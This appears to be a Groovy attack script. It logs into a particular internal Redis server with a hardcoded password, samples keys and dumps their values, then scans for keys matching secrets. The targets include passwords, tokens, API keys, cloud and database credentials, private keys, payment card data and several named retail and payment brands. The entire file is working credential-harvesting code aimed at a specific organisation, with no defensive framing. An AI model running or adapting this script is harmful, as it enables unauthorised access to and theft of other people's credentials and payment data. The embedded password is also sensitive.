import java.net.Socket
import java.io.BufferedReader
import java.io.InputStreamReader

def redisExec(String host, int port, String password, List<String> commands) {
    def results = []
    Socket sock = null
    try {
        sock = new Socket()
        sock.connect(new java.net.InetSocketAddress(host, port), 5000)
        sock.setSoTimeout(5000)
        def os = sock.getOutputStream()
        def br = new BufferedReader(new InputStreamReader(sock.getInputStream()))
        
        os.write("AUTH ${password}\r\n".getBytes())
        os.flush()
        Thread.sleep(300)
        readAll(br)
        
        commands.each { cmd ->
            os.write("${cmd}\r\n".getBytes())
            os.flush()
            Thread.sleep(300)
            results << [cmd: cmd, resp: readAll(br)]
        }
    } catch (Exception e) {
        results << [cmd: "ERROR", resp: "${e.class.simpleName}: ${e.message}"]
    } finally {
        try { sock?.close() } catch(Exception e) {}
    }
    return results
}

def readAll(BufferedReader br) {
    def sb = new StringBuilder()
    try {
        while (true) {
            if (!br.ready()) { Thread.sleep(200); if (!br.ready()) break }
            def line = br.readLine()
            if (line == null) break
            sb.append(line).append('\n')
        }
    } catch (java.net.SocketTimeoutException e) {}
    return sb.toString().trim()
}

println "=== DEEP KEY SCAN + RANDOM SAMPLE ==="

def cmds = []

// 1. Random sample of keys
cmds << "RANDOMKEY"
cmds << "RANDOMKEY"
cmds << "RANDOMKEY"
cmds << "RANDOMKEY"
cmds << "RANDOMKEY"
cmds << "RANDOMKEY"
cmds << "RANDOMKEY"
cmds << "RANDOMKEY"
cmds << "RANDOMKEY"
cmds << "RANDOMKEY"

def r1 = redisExec("172.27.140.151", 6379, "@st0rAg3K3Y", cmds)
println "\n--- RANDOM KEY SAMPLES ---"
def sampleKeys = []
r1.each { r ->
    def key = r.resp.replaceAll('\\$\\d+\\n', '').trim()
    sampleKeys << key
    println "KEY: ${key}"
}

// 2. Get TYPE and value of each sampled key
def typeCmds = []
sampleKeys.each { k ->
    typeCmds << "TYPE ${k}"
}
def r2 = redisExec("172.27.140.151", 6379, "@st0rAg3K3Y", typeCmds)
println "\n--- KEY TYPES ---"
r2.each { r ->
    println "${r.cmd} => ${r.resp}"
}

// 3. GET values of string keys (first 5)
def getCmds = []
sampleKeys.take(5).each { k ->
    getCmds << "GET ${k}"
    getCmds << "TTL ${k}"
}
def r3 = redisExec("172.27.140.151", 6379, "@st0rAg3K3Y", getCmds)
println "\n--- KEY VALUES (first 5) ---"
r3.each { r ->
    def val = r.resp
    if (val.length() > 500) val = val.substring(0, 500) + "...[TRUNCATED]"
    println "${r.cmd} => ${val}"
}

// 4. Extended pattern scan
def patterns = [
    "*password*", "*pass*", "*pwd*",
    "*credential*", "*cred*",
    "*mysql*", "*mariadb*", "*postgres*", "*mongo*",
    "*sears*", "*t1pago*", "*t1pagos*",
    "*mrc*", "*claroshop*",
    "*secret*", "*token*", "*jwt*",
    "*api_key*", "*apikey*",
    "*admin*", "*root*",
    "*connection*", "*conn_string*", "*dsn*",
    "*database*", "*dbhost*",
    "*smtp*", "*mail*", "*email*",
    "*aws*", "*s3*", "*bucket*",
    "*certificate*", "*private_key*", "*ssl*",
    "*ldap*", "*active_directory*",
    "*env*", "*environment*",
    "*payment*", "*pago*", "*tarjeta*", "*card*",
    "LARAVEL*", "laravel*",
    "horizon*", "queue*", "job*",
    "*cache*",
    "*login*", "*signin*",
]

def scanCmds = []
patterns.each { p ->
    scanCmds << "SCAN 0 MATCH ${p} COUNT 200"
}

def r4 = redisExec("172.27.140.151", 6379, "@st0rAg3K3Y", scanCmds)
println "\n--- PATTERN SCAN RESULTS ---"
r4.each { r ->
    def resp = r.resp
    def lines = resp.split('\n').findAll { !it.startsWith('*') && !it.startsWith('\$') && it.trim() }
    if (lines.size() > 1) {
        println "\n${r.cmd}:"
        lines.each { println "  ${it}" }
    }
}

println "\n=== DEEP SCAN DONE ==="
